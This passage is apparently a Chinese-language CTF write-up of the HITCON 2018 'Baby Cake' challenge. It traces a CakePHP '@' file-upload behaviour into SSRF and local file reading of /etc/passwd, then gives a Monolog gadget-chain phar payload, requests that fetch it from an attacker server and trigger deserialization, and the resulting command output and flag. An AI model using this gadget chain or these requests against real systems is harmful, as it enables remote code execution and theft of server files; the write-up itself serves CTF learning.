    {
        if (is_array($value)) {
            $this->addRecursive($name, $value);
        } elseif (is_resource($value)) {
            $this->addFile($name, $value);
        } elseif (is_string($value) && strlen($value) && $value[0] === '@') {
            trigger_error(
                'Using the @ syntax for file uploads is not safe and is deprecated. ' .
                'Instead you should use file handles.',
                E_USER_DEPRECATED
            );
            $this->addFile($name, $value);
        } elseif ($name instanceof FormDataPart && $value === null) {
            $this->_hasComplexPart = true;
            $this->_parts[] = $name;
        } else {
            $this->_parts[] = $this->newPart($name, $value);
        }
        return $this;
    }
可以看到如果开头第一个字符是 `@` 的话，cakephp 会调用 `addFile` 函数，而很明显 `addFile` 可以访问本地的文件：
    public function addFile($name, $value)
    {
        $this->_hasFile = true;
        $filename = false;
        $contentType = 'application/octet-stream';
        if (is_resource($value)) {
            $content = stream_get_contents($value);
            if (stream_is_local($value)) {
                $finfo = new finfo(FILEINFO_MIME);
                $metadata = stream_get_meta_data($value);
                $contentType = $finfo->file($metadata['uri']);
                $filename = basename($metadata['uri']);
            }
        } else {
            $finfo = new finfo(FILEINFO_MIME);
            $value = substr($value, 1);
            $filename = basename($value);
            $content = file_get_contents($value);
            $contentType = $finfo->file($value);
        }
        $part = $this->newPart($name, $content);
        $part->type($contentType);
        if ($filename) {
            $part->filename($filename);
        }
        $this->add($part);
        return $part;
    }
可以看到这里我们可以控制 `file_get_contents` 的参数，参数是我们传入的 `?data` 所对应的值，所以这里存在着一个
SSRF，但最终考点不在这里。可起码我们确实可以控制 Server 去访问指定的 url，如：
`POST
http://13.230.134.135/?url=http://5ax2cw.ceye.io/&data[test]=@file:///etc/passwd`
可以在 post data 处看到我们希望读取的文件：
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
    systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
    syslog:x:102:106::/home/syslog:/usr/sbin/nologin
    messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
    _apt:x:104:65534::/nonexistent:/usr/sbin/nologin
    lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
    dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
    sshd:x:109:65534::/run/sshd:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false
    ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
    orange:x:1001:1001:,,,:/home/orange:/bin/bash
然后就是今年非常火的 `phar://` 协议的反序列化问题，我们可以通过该协议触发反序列化操作进而 getshell。大致思路如下：
  1. 构造相应的 payload
  2. 将相应的 payload 放入某个 phar 文件中，并放到我们的服务器上
  3. 通过题目提供的功能访问我们服务器上的 phar 文件，此时相应文件被写入缓存中，具体路径为 `/var/www/html/tmp/cache/mycache/CLIENT_IP/MD5(http://IP/xxz.phar)/body.cache`
  4. 通过 `post` 请求 `phar://` 协议的反序列化进而触发我们的 payload
如何构造可以使用
进行构造，这里贴上 PDKT-Team 所使用的 payload：
    socket = $x;
            }
        }
        class BufferHandler
        {
            protected $handler;
            protected $bufferSize = -1;
            protected $buffer;
            # ($record['level'] level) == false
            protected $level = null;
            protected $initialized = true;
            # ($this->bufferLimit > 0 && $this->bufferSize === $this->bufferLimit) == false
            protected $bufferLimit = -1;
            protected $processors;
            function __construct($methods, $command)
            {
                $this->processors = $methods;
                $this->buffer = [$command];
                $this->handler = clone $this;
            }
        }
    }
    namespace{
        $cmd = "ls -alt";
        $obj = new \Monolog\Handler\SyslogUdpHandler(
            new \Monolog\Handler\BufferHandler(
                ['current', 'system'],
                [$cmd, 'level' => null]
            )
        );
        $phar = new Phar('exploit.phar');
        $phar->startBuffering();
        $phar->addFromString('test', 'test');
        $phar->setStub('');
        $phar->setMetadata($obj);
        $phar->stopBuffering();
    }
然后我们将构造好的 `exploit.phar` 放到我们的服务器上，再通过 get 请求将其写入缓存：
    GET http://13.230.134.135/?url=http://IP/exploit.phar
然后调用 post 请求触发反序列化操作：
    POST http://13.230.134.135/?url=http://IP&data[test]=@phar:///var/www/html/tmp/cache/mycache/CLIENT_IP/MD5(http://IP/exploit.phar)/body.cache
ps: 我在复现的时候，将 `$cmd = "ls -alt"` 改写成了 `$cmd = "ls -al / >
/tmp/ls.txt"`，因为我发现直接调用的时候无法看到回显，只能通过这种间接的方式再读一次回显。
    total 104
    drwxr-xr-x  26 root root  1000 Oct 21 11:08 run
    drwxrwxrwt   2 root root  4096 Oct 21 06:25 tmp
    -rwsr-sr-x   1 root root  8568 Oct 18 19:53 read_flag
    drwxr-xr-x  23 root root  4096 Oct 18 19:53 .
    drwxr-xr-x  23 root root  4096 Oct 18 19:53 ..
    drwx------   5 root root  4096 Oct 18 17:12 root
    drwxr-xr-x  90 root root  4096 Oct 18 11:23 etc
    dr-xr-xr-x  13 root root     0 Oct 16 07:57 sys
    -r--------   1 root root    54 Oct 15 19:49 flag
    drwxr-xr-x   4 root root  4096 Oct 15 19:41 home
    drwxr-xr-x   3 root root  4096 Oct  9 06:07 boot
    lrwxrwxrwx   1 root root    31 Oct  9 06:07 initrd.img -> boot/initrd.img-4.15.0-1023-aws
    lrwxrwxrwx   1 root root    28 Oct  9 06:07 vmlinuz -> boot/vmlinuz-4.15.0-1023-aws
    drwxr-xr-x   2 root root  4096 Oct  9 06:07 sbin
    lrwxrwxrwx   1 root root    14 Oct  8 17:14 www -> /var/www/html/
    drwxr-xr-x  14 root root  4096 Oct  8 17:13 var
    drwxr-xr-x   5 root root  4096 Oct  8 17:06 snap
    drwxr-xr-x  15 root root  2980 Oct  8 17:06 dev
    dr-xr-xr-x 136 root root     0 Oct  8 17:06 proc
    lrwxrwxrwx   1 root root    31 Sep 12 16:16 initrd.img.old -> boot/initrd.img-4.15.0-1021-aws
    lrwxrwxrwx   1 root root    28 Sep 12 16:16 vmlinuz.old -> boot/vmlinuz-4.15.0-1021-aws
    drwxr-xr-x  20 root root  4096 Sep 12 16:16 lib
    drwx------   2 root root 16384 Sep 12 16:10 lost+found
    drwxr-xr-x   2 root root  4096 Sep 12 15:59 bin
    drwxr-xr-x   2 root root  4096 Sep 12 15:56 lib64
    drwxr-xr-x  10 root root  4096 Sep 12 15:55 usr
    drwxr-xr-x   2 root root  4096 Sep 12 15:55 media
    drwxr-xr-x   2 root root  4096 Sep 12 15:55 opt
    drwxr-xr-x   2 root root  4096 Sep 12 15:55 mnt
    drwxr-xr-x   2 root root  4096 Sep 12 15:55 sr
可以看到同上一题一样，flag 文件没有直接读取的权限，但能通过运行 read_flag 的方式获得 flag:
`hitcon{smart_implementation_of_CURLOPT_SAFE_UPLOAD>
（默默地膜
## PS
orange 出的题实在是有难度，还剩下两题看他的三言两语还是无法领悟，只能期待更详细的 writeup 了，如果能侥幸学会了就继续补充（逃
## 参考
  * [My CTF Web Challenges](https://github.com/orangetw/My-CTF-Web-Challenges)
  * [Remote Code Execution in Web.py framework](https://securityetalii.es/2014/11/08/remote-code-execution-in-web-py-framework/)
  * [HITCON2018-WP-By Nu1L](https://xz.aliyun.com/t/2953)
  * [Baby Cake](https://github.com/PDKT-Team/ctf/tree/master/hitcon2018/baby-cake)
  * [Phar与Stream Wrapper造成PHP RCE的深入挖掘](https://xz.aliyun.com/t/2958)